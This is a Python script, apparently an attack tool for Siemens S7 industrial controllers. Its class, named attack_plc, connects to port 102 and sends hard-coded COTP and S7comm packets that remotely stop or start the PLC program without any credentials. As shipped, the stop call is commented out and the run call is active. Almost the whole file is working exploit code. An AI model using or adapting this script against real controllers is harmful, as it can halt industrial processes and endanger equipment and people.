import os
import socket
import struct
import time
import sys


class attack_plc:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect_target(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(3)
        self.sock.connect((self.ip, self.port))

    def send(self, data):
        """
        发送数据
        :param data: 数据
        :return: 返回数据
        """
        self.sock.send(data)
        hdr = self.sock.recv(4)
        length = struct.unpack('>H', hdr[2:4])[0]
        left = length - 4
        fin_data = b''
        if left > 0:
            recv_data = self.sock.recv(left)
            if not recv_data:
                pass
            else:
                fin_data += recv_data
                left -= len(recv_data)
        return hdr + fin_data

    #  tpkt版本号 cotp pdu链接请求 一次认证
    def cr(self):
        cc_cotp = bytes.fromhex("0300001611e00000002500c1020101c2020101c0010a")
        self.send(cc_cotp)

    # 二次认证
    def s7_tpkt(self):
        s7_setup = bytes.fromhex("0300001902f08032010000ccc100080000f0000001000103c0")
        self.send(s7_setup)

    def run_plc(self):
        s7comm_run = bytes.fromhex('0300002502f08032010000003a0014000028000000000000fd000009505f50524f4752414d')
        data = self.send(s7comm_run)

    def stop_plc(self):
        s7comm_stop = bytes.fromhex('0300002102f0803201000000060010000029000000000009505f50524f4752414d')
        self.send(s7comm_stop)
        self.sock.recv(1024)


    def close(self):
        self.sock.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Usage: {} IP_ADDRESS'.format(sys.argv[0]))
        sys.exit(1)
    IP = sys.argv[1]
    target_plc = attack_plc(IP, 102)
    target_plc.connect_target()
    target_plc.cr()
    target_plc.s7_tpkt()
    print("*** restore ***")
    target_plc.run_plc()
    time.sleep(0.2)
    # target_plc.stop_plc()
    print("*** finish ***")
    target_plc.close()
    exit(0)
